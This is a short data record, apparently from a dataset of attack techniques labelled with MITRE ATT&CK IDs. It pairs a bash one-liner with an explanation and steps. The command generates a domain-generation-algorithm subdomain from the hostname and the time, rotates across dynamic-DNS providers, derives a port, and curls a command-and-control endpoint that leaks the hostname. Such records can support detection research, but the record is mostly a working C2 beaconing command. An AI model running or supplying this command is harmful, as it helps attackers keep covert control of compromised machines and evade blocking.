command: seed="$(hostname -s)$(date -u +%j%H)"; sub=$(printf "%s" "$seed" | sha256sum | cut -c1-16); tlds=(duckdns.org dynu.net ddns.net no-ip.org); dom="$sub.${tlds[$(($(date -u +%M) % ${#tlds[@]}))]}"; hex=$(echo -n "$sub" | tr -dc '0-9a-f' | cut -c1-4); port=$(( (16#$hex % 10000) + 20000 )); curl -k --connect-timeout 7 "https://$dom:$port/hi?u=$(hostname -s)"
explanation: Combines hostname and time to generate a DGA label, rotates across multiple dynamic DNS providers, and computes a port from the hash to vary C2 endpoints. This is dynamic resolution behavior per T1568.
rationale_steps: Create a seed using host-specific and temporal data.
SHA-256 hash the seed to form a pseudo-random subdomain.
Select a provider domain based on the current minute.
Derive a port from the hash and connect with curl.
